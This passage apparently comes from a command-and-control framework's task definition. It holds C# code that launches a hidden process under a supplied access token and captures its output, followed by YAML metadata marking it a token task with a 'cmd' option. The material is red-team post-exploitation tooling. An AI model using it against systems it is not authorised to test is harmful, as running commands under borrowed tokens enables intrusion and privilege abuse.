childProcessStdOutRead, out childProcessStdOutWrite,\n                    ref securityAttributes, 8196))\n            {\n                goto end;\n            }\n\n\n            STARTUPINFO startupInfo = new STARTUPINFO();\n            startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));\n            startupInfo.hStdError = childProcessStdOutWrite;\n            startupInfo.hStdOutput = childProcessStdOutWrite;\n            startupInfo.hStdInput = IntPtr.Zero;\n            startupInfo.dwFlags = (int)NativeMethod.STARTF_USESTDHANDLES;\n\n            NativeMethod.SetHandleInformation(childProcessStdOutRead, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);\n            NativeMethod.SetHandleInformation(childProcessStdOutWrite, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);\n\n\n\n            if (CreateProcess(tokenHandle, commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,\n                    out processInformation))\n            {\n              \n                NativeMethod.CloseHandle(childProcessStdOutWrite);\n                childProcessStdOutWrite = IntPtr.Zero;\n\n                childProcessReadStream = new FileStream(childProcessStdOutRead, FileAccess.Read, false);\n\n                byte[] readBytes = new byte[4096];\n                uint bytesAvail = 0;\n                uint BytesLeftThisMessage = 0;\n                uint bytesRead = 0;\n                int read = 0;\n\n                while (true)\n                {\n                    if (!NativeMethod.PeekNamedPipe(childProcessStdOutRead, readBytes, (uint)readBytes.Length,\n                        ref bytesRead, ref bytesAvail, ref BytesLeftThisMessage))\n                    {\n                        break;\n                    }\n\n                    if (bytesAvail > 0)\n                    {\n                        read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);\n                        consoleWriter.Write(Encoding.Default.GetChars(readBytes, 0, read));\n                    }\n\n                }\n\n\n            }\n        end:\n            if (childProcessReadStream != null)\n            {\n                childProcessReadStream.Close();\n            }\n            if (processInformation.hProcess != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(processInformation.hProcess);\n            }\n            if (processInformation.hThread != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(processInformation.hThread);\n            }\n            if (childProcessStdOutRead != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(childProcessStdOutRead);\n            }\n            if (childProcessStdOutWrite != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(childProcessStdOutWrite);\n            }\n        }\n\n\n    }\n\n\n\n}"
  Compiled: false
  TaskingType: Assembly
  ReferenceSourceLibraries: []
  ReferenceAssemblies:
  - Name: mscorlib.dll
    Location: net35\mscorlib.dll
    DotNetVersion: Net35
  - Name: System.Configuration.Install.dll
    Location: net35\System.Configuration.Install.dll
    DotNetVersion: Net35
  - Name: System.Core.dll
    Location: net35\System.Core.dll
    DotNetVersion: Net35
  - Name: System.Data.DataSetExtensions.dll
    Location: net35\System.Data.DataSetExtensions.dll
    DotNetVersion: Net35
  - Name: System.Data.dll
    Location: net35\System.Data.dll
    DotNetVersion: Net35
  - Name: System.DirectoryServices.AccountManagement.dll
    Location: net35\System.DirectoryServices.AccountManagement.dll
    DotNetVersion: Net35
  - Name: System.DirectoryServices.dll
    Location: net35\System.DirectoryServices.dll
    DotNetVersion: Net35
  - Name: System.DirectoryServices.Protocols.dll
    Location: net35\System.DirectoryServices.Protocols.dll
    DotNetVersion: Net35
  - Name: System.dll
    Location: net35\System.dll
    DotNetVersion: Net35
  - Name: System.Drawing.dll
    Location: net35\System.Drawing.dll
    DotNetVersion: Net35
  - Name: System.IdentityModel.dll
    Location: net35\System.IdentityModel.dll
    DotNetVersion: Net35
  - Name: System.Management.Automation.dll
    Location: net35\System.Management.Automation.dll
    DotNetVersion: Net35
  - Name: System.Management.dll
    Location: net35\System.Management.dll
    DotNetVersion: Net35
  - Name: System.Security.dll
    Location: net35\System.Security.dll
    DotNetVersion: Net35
  - Name: System.ServiceProcess.dll
    Location: net35\System.ServiceProcess.dll
    DotNetVersion: Net35
  - Name: System.Web.Extensions.dll
    Location: net35\System.Web.Extensions.dll
    DotNetVersion: Net35
  - Name: System.Windows.Forms.dll
    Location: net35\System.Windows.Forms.dll
    DotNetVersion: Net35
  - Name: System.XML.dll
    Location: net35\System.XML.dll
    DotNetVersion: Net35
  - Name: mscorlib.dll
    Location: net40\mscorlib.dll
    DotNetVersion: Net40
  - Name: System.Configuration.Install.dll
    Location: net40\System.Configuration.Install.dll
    DotNetVersion: Net40
  - Name: System.Core.dll
    Location: net40\System.Core.dll
    DotNetVersion: Net40
  - Name: System.Data.DataSetExtensions.dll
    Location: net40\System.Data.DataSetExtensions.dll
    DotNetVersion: Net40
  - Name: System.Data.dll
    Location: net40\System.Data.dll
    DotNetVersion: Net40
  - Name: System.DirectoryServices.AccountManagement.dll
    Location: net40\System.DirectoryServices.AccountManagement.dll
    DotNetVersion: Net40
  - Name: System.DirectoryServices.dll
    Location: net40\System.DirectoryServices.dll
    DotNetVersion: Net40
  - Name: System.DirectoryServices.Protocols.dll
    Location: net40\System.DirectoryServices.Protocols.dll
    DotNetVersion: Net40
  - Name: System.dll
    Location: net40\System.dll
    DotNetVersion: Net40
  - Name: System.Drawing.dll
    Location: net40\System.Drawing.dll
    DotNetVersion: Net40
  - Name: System.IdentityModel.dll
    Location: net40\System.IdentityModel.dll
    DotNetVersion: Net40
  - Name: System.Management.Automation.dll
    Location: net40\System.Management.Automation.dll
    DotNetVersion: Net40
  - Name: System.Management.dll
    Location: net40\System.Management.dll
    DotNetVersion: Net40
  - Name: System.Security.dll
    Location: net40\System.Security.dll
    DotNetVersion: Net40
  - Name: System.ServiceProcess.dll
    Location: net40\System.ServiceProcess.dll
    DotNetVersion: Net40
  - Name: System.Web.Extensions.dll
    Location: net40\System.Web.Extensions.dll
    DotNetVersion: Net40
  - Name: System.Windows.Forms.dll
    Location: net40\System.Windows.Forms.dll
    DotNetVersion: Net40
  - Name: System.XML.dll
    Location: net40\System.XML.dll
    DotNetVersion: Net40
  EmbeddedResources: []
  UnsafeCompile: true
  TokenTask: true
  Options:
  - Name: cmd
    Value: ''
    DefaultValue: ''
    Description: process to start
    SuggestedValues: []
    Optional: true
    DisplayInCommand: true
    FileOption: false
    GruntTaskId: 40
